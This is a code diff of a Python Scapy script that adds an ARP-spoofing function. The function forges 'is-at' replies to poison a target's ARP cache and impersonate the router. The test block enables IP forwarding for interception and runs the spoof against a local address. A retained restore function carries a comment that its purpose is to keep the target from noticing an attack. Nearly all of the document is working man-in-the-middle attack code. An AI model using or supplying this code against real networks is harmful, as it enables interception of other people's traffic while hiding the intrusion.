@@ -23,19 +23,41 @@ def getMacAddr(ip):
     if result:
         return result[0][1].src
     
-def restore(target_ip, host_ip, verbose=True):
+def spoof(targetIP, hostIP, verbose=True):
+    #will spoof the targetIP pretending to be the 'hostIP' argument, this is done by changing the ARP cache of the target IP.
+
+    #first we get the macAddr of the target
+    targetMac = getMacAddr(targetIP)
+
+    #create an ARP response ('is-at' ARP operation packet).
+     
+    arpResponse = ARP(pdst=targetIP, hwdst= targetMac, psrc=hostIP, op='is-at')
+    
+    #verbose = 0 means a packet will be sent without printing anything
+    send(arpResponse, verbose=0)
+    if verbose:
+        #obtain MAC address of our default interface
+        myMac = ARP().hwsrc
+        print(f'[+] Sent to {targetIP} : {hostIP} us-at {myMac}')
+
+def restore(targetIP, hostIP, verbose=True):
     #must reset everything or else the targets internet will crash
     #and the target will know an attack has happened
-    target_mac = getMacAddr(target_ip) # the real MAC address of target
-    host_mac = getMacAddr(host_ip)#the real MAC address of spoofed router
-    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, hwsrc=host_mac) # crafting the restoring packet
+    target_mac = getMacAddr(targetIP) # the real MAC address of target
+    host_mac = getMacAddr(hostIP)#the real MAC address of spoofed router
+    arp_response = ARP(pdst=targetIP, hwdst=target_mac, psrc=hostIP, hwsrc=host_mac) # crafting the restoring packet
     send(arp_response, verbose=0, count=7)# sending the restoring packet
     if verbose:
-        print("[+] Sent to {} : {} is-at {}".format(target_ip, host_ip, host_mac))
+        print(f'[+] Sent to {targetIP} : {hostIP} is-at {host_mac}')
 
 # for testing
-targetIP = '192.168.0.1'
+targetIP = '192.168.1.1'
 
-#enable_linuxip()
+enable_linuxip()
 print(getMacAddr(targetIP))
-restore('192.168.0.63',targetIP,True)
+#restore('192.168.0.63',targetIP,True)
+
+spoof(targetIP, '192.168.1.144')
+
+
+
